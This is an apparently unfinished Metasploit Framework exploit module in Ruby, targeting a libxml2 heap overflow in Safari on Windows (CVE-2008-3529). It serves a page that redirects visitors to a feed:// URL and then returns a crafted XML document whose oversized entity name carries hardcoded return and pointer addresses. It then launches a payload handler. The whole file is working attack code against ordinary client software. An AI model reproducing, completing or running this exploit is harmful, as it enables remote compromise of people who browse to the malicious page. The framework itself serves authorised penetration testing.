##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote

  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Exploit::Remote::BrowserAutopwn
  autopwn_info({
    :ua_name    => HttpClients::SAFARI,
    :javascript => true,
    :rank       => NormalRanking, # reliable memory corruption
    :vuln_test  => nil,
  })

  def initialize(info = {})
    super(update_info(info,
      'Name'           => '[INCOMPLETE] Safari libxml2 feed:// URL Heap Overflow',
      'Description'    => %q{ },
      'License'        => BSD_LICENSE,
      'Author'         => [ 'egypt' ],
      'Version'        => '$Revision$',
      'References'     => 
        [
           ['BID', '31126'],
           ['CVE', '2008-3529'],
        ],
      'Payload'        =>
        {
          'Space'    => 1024,
          'BadChars' => "\x00",
          'DisableNops' => true,
        },
      'Targets'        =>
        [
          # Target 0: Automatic
          [
            'Windows Safari 3.2.1 via libxml2.dll',
            {
              # Addresses must be alphanumeric ascii
              'Platform' => [ 'win' ],
              #'Ret'      => 0x62306e38,  # call eax; libxml2.dll
              #'Ret'      => 0x62317666,  # call ebx; libxml2.dll
              #'Ret'      => 0x62315233,  # call ecx; libxml2.dll
              #'Ret'      => 0x62306e55,  # call edx; libxml2.dll
              #'Ret'      => 0x62334f4c,  # call edi; libxml2.dll
              'Ret'      => 0x62353068,  # call esi; libxml2.dll
              #'Ret'      => 0x62314169,  # call ebp; libxml2.dll
              #'Where'    => 0x30313233, # Need a pointer that gets called
              'Where'    => 0x77ed73b4, # Need a pointer that gets called
            },
          ],
        ],
      'DefaultTarget'  => 0))
  end

  def on_request_uri(cli, request)
    # Re-generate the payload
    return if ((p = regenerate_payload(cli)) == nil)

    headers = {
      'Cache-control' => 'must-revalidate',
      'Expires' => '0'
    }
    case request.uri
    when get_resource()
      print_status("Sending #{self.name} to #{cli.peerhost}:#{cli.peerport}...")

      content = "<html><head></head><body>"
      content << "<script><!--\n"
      content << "location.href = 'feed://' + location.host + '#{get_resource}feed';\n"
      content << "//--></script>"
      content << "</body></html>"
    when /feed/
      print_status("Sending evil feed to #{cli.peerhost}:#{cli.peerport}...")

      sets = [("A".."Z").to_a.join, ("a".."j").to_a.join, ("k".."z").to_a.join]
      pattern = Rex::Text.pattern_create(1000, sets)

      pattern[207,4] = [target.ret].pack("V")
      pattern[211,4] = [target['Where']].pack("V")
      # For debug heap
      #pattern[223,4] = [target.ret].pack("V")
      #pattern[227,4] = [0x78787878].pack("V")

      content = '<?xml version="1.0"?>' + "\n" +
                '<!DOCTYPE longentity [' + "\n" +
            '<!ELEMENT longentity (#PCDATA)>' + "\n" +
            '<!ENTITY ' +
            pattern +
            " \"#{rand_text_alpha(5)}\"> ]>\n" +
            '<longentity location="&' +
            pattern +
            ';">text</longentity>' + "\n"
      headers["Content-Type"] = "text/xml"
    end
    send_response(cli, content, headers)

    # Handle the payload
    handler(cli)

  end

end
